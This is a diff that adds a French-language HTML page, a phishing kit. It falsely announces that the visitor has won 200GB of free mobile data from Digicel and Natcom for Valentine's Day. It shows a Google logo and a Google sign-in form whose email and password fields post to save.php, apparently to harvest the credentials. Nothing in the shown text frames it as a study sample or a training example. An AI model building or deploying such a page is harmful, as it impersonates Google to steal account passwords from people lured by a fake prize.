@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion - Mon Site</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
+</head>
+<body>
+
+    <div class="login-container">
+        <div class="announcement">
+            🎉 Félicitations ! <br> Vous êtes sélectionné dans le cadre du programme de Digicel et Natcom 🎉  
+            200GB de données valables pour 1 mois à l'occasion de la Saint-Valentin ❤️  
+        </div>
+
+        <div class="login-box">
+            <img src="img/logo-google.png" alt="Logo" class="logo">
+            <h2>Se connecter</h2>
+            <p>Utilisez votre compte Google</p>
+            
+            <form action="save.php" method="POST">
+                <div class="input-group">
+                    <i class="fas fa-envelope"></i>
+                    <input type="email" id="email" name="email" placeholder="Email" required>
+                </div>
+
+                <div class="input-group">
+                    <i class="fas fa-lock"></i>
+                    <input type="password" id="password" name="password" placeholder="Mot de passe" required>
+                </div>
+
+                <div class="options">
+                    <a href="#">Mot de passe oublié ?</a>
+                </div>
+
+                <button type="submit">Suivant</button>
+            </form>
+
+            <div class="signup">
+                <p>Vous n'avez pas de compte ? <a href="#">Créer un compte</a></p>
+            </div>
+        </div>
+    </div>
+
+</body>
+</html>
